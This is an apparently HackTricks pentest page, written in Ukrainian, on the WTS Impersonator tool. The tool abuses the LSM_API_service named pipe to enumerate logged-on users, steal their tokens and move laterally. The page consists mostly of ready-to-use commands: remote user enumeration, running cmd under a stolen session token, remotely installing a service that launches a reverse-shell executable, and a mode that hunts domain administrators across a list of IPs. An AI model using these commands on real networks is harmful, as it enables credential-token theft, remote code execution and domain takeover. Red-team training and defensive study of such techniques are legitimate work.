{{#include ../../banners/hacktricks-training.md}}

Інструмент **WTS Impersonator** використовує **"\\pipe\LSM_API_service"** RPC Named pipe для прихованого перерахунку увійдених користувачів та захоплення їх токенів, обходячи традиційні техніки імперсонування токенів. Цей підхід полегшує безперешкодні бічні переміщення в мережах. Інновація, що стоїть за цією технікою, належить **Omri Baso, чия робота доступна на [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Основна Функціональність

Інструмент працює через послідовність викликів API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ключові модулі та використання

- **Перерахунок користувачів**: Локальний та віддалений перерахунок користувачів можливий за допомогою інструмента, використовуючи команди для кожного сценарію:

- Локально:
```bash
.\WTSImpersonator.exe -m enum
```
- Віддалено, вказуючи IP-адресу або ім'я хоста:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Виконання команд**: Модулі `exec` та `exec-remote` вимагають контексту **Служби** для функціонування. Локальне виконання просто потребує виконуваного файлу WTSImpersonator та команди:

- Приклад для локального виконання команди:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe можна використовувати для отримання контексту служби:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Віддалене виконання команд**: Включає створення та встановлення служби віддалено, подібно до PsExec.exe, що дозволяє виконання з відповідними правами.

- Приклад віддаленого виконання:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Модуль полювання на користувачів**: Орієнтується на конкретних користувачів на кількох машинах, виконуючи код під їхніми обліковими даними. Це особливо корисно для націлювання на адміністраторів домену з локальними правами адміністратора на кількох системах.
- Приклад використання:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
